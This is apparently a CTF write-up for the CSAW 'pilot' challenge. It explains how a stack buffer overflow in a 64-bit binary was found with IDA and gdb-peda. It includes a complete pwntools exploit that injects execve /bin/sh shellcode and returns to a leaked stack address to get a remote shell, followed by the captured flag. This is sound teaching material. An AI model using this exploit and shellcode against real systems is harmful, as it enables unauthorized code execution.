# pilot Writeup

![pilot](https://user-images.githubusercontent.com/41026969/50910626-2e3dd000-13fc-11e9-8ec9-58243f541a8e.png)

Ok so the description doesn't really give us much of anything, just an executable to work with and a ```nc``` address.
##### note: this ```nc``` address won't work for you since it's unique to each individual and requires vpn, check out links in my CTF page and look at the 365 CSAW link.

First, I did a few checks:

![pilot](https://user-images.githubusercontent.com/41026969/50911285-86290680-13fd-11e9-97aa-da7c1e90efe5.png)

To quickly explain what I did for every command I did:
```chmod +x pilot``` gives pilot permission to execute (to run). If we didn't, if we tried to run it it'd say "Permission Denied." ```file pilot``` checks what kind of file pilot is. We learn that this is a 64 bit executable which means 8 byte addresses (which may be handy to us further down). ```checksec pilot``` checks the properties of an executable. We see that the program does not utilize a [stack canary](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries) (which essential checks to see if the stack has been changed for buffer overflow possibility). We then just test the program by passing a bunch of letters into it.

### Reverse engineering time
So I opened the file in IDApro 64 bit. In IDA, you can generate pseudocode by clicking ```view -> open subviews -> generate pseudocode```. Looking at the ```main``` function, I see this interesting piece of code:

![pilot](https://user-images.githubusercontent.com/41026969/51258592-56877a80-1978-11e9-844a-75a29572e2b8.png)

So from the code above, we can see a few things. 
1) The read() instruction is called
2) The function will take in 64 bytes (or characters) into standard input (in IDA, you can right click and convert the hex to decimal)
3) if what we inputted is less than or equal to 4 bytes, we see that ```[*]There are no commands....``` and ```[*]Mission Failed....``` will get printed out - that's not what I want...

I looked at the disassembly x86 instructions next, specifically looked at the main function again. I saw this:

![pilot](https://user-images.githubusercontent.com/41026969/51260034-60f74380-197b-11e9-8d90-c6202fc5fe3e.png)

This is the part where the [function prologue](https://en.wikipedia.org/wiki/Function_prologue) takes place. We see that the function only allocates 32 bytes of space (I converted the hex value IDA says into decimal) into the stack, this is strange because even though the function prologue creates the stack with 32 bytes of memory, the buffer that we're inputting into is 64 bytes... This program is exploitable via buffer overflow.

### Exploiting
To know better about the program and the stack, I used gdb with [peda](https://github.com/longld/peda) (python exploit development assistance). peda is an excellent tool as it allows us to observe the stack and registers after the program exits and it includes some fancy color text. So first I run the program in gdb peda by typing ```gdb pilot```. Then I type ```r``` to run the program. 

So we need to find how many bytes we need to feed into the input before the return address is popped. To do this, when the program is run, I first input ```AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP```. We input this because when we examine the stack registers later, we will be able to see which letters have overflowed through the base pointer into the stack pointer. Here's a picture of it below:

![pilot](https://user-images.githubusercontent.com/41026969/51324731-7337b700-1a39-11e9-8471-eed6010d64cb.png)

So if you didn't read the [function prologue](https://en.wikipedia.org/wiki/Function_prologue) page in the beginning of this writeup here's a quick summary:

1) the return address is pushed onto the stack (so the function knows where to return after the function called is done)
2) the base pointer is pushed onto the stack
3) the stack pointer is made equal to the base pointer
4) the stack pointer is then subtracted by a set amount (depends on some stuff). The space that's made between the stack pointer and the base pointer is used to memory. This is the space in memory that we will overwrite and exploit

In the picture above the ```RBP``` stands for base pointer, and wee see it's: ```RBP: 0x4a4a4a4a49494949 ('IIIIJJJJ')```. Hence, it took from A (four times) to J (four times) to overwrite into the return address (total of 40 characters).

So we can write some shellcode that will execute to /bin/sh to get us a shell running as the host (pilot). Doing some researching we find shell code for 64 bit /bin/sh exploit [here](http://shell-storm.org/shellcode/files/shellcode-811.php).

Here is the code I came up with (also attached above):
```python
# Exploit for the pilot CSAW challenge

from pwn import *

session = remote("10.67.0.1", 30983)

session.recvuntil("[*]Location:")

address = session.recvuntil("\n")[:-1]

shellcode = "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"

payload = shellcode + "A" * (40-len(shellcode)) + p64(int(address, 16)) 

print("Address: " + str(address))
print("total payload: " + str(payload))

session.sendline(payload)

session.interactive()
```
Walking through the code:

- I basically open a session to the address
- I start reading the adddress that's given from the program and store it into ```address``` then remove the new line character at the end
- the ```shellcode``` variable is from the link from googling
- to put together the payload, it's first the shellcode, then number of bytes times (40 minus length of shellcode) to make sure we don't over write too much. Then the last part is simply the 8 byte address (padded with 2 extra bytes at the end because the original address given is 6 bytes total) that was given from the program.
- we then just send the payload and set up interactive().

##### note: that nc address won't work (it's based on your CSAW365 account) and you need a vpn.

![pilot](https://user-images.githubusercontent.com/41026969/51542112-77444a00-1e28-11e9-96c8-dd56335d3f02.png)

Running the code will come up with the flag:
```flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}```
